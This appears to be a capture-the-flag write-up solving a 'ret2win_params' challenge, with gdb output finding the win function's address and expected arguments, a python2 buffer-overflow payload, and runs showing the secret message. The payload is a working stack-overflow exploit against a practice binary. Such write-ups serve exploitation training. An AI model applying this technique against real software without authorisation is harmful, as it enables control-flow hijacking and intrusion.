### SOLVE

// Locate win-function, control EIP, find parameters
```as
gdb -q ret2win_params
info functions
main:           0x0804922b      
hacked:         0x08049182      '\x82\x91\x04\x08'
register_name:  0x080491d5    

disas hacked:
0x08049193 <+17>:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
0x0804919c <+26>:    cmp    DWORD PTR [ebp+0xc],0xc0debabe

convert to LE:
0xdeadbeef = '\xef\xbe\xad\xde' 
0xc0debabe = '\xbe\xba\xde\xc0'
```
// Create payload
```shell
// [padding + hacked-address + nops + cmp1 + cmp2]
python2 -c "print('A'*28 + '\x82\x91\x04\x08' + '\x90'*4 + '\xef\xbe\xad\xde' + '\xbe\xba\xde\xc0' )" > payload
``` 
// Run payload
```shell
└─$ ./ret2win_params < payload
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA�����ﾭ޾���
This function is TOP SECRET! How did you get in here?! :O
zsh: segmentation fault  ./ret2win_params < payload

```
// Other way to run payload
```shell
└─$ python2 -c "print('A'*28 + '\x82\x91\x04\x08' + '\x90'*4 + '\xef\xbe\xad\xde' + '\xbe\xba\xde\xc0' )" | ./ret2win_params
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA�����ﾭ޾���
This function is TOP SECRET! How did you get in here?! :O
zsh: done                python2 -c  | 
zsh: segmentation fault  ./ret2win_params

```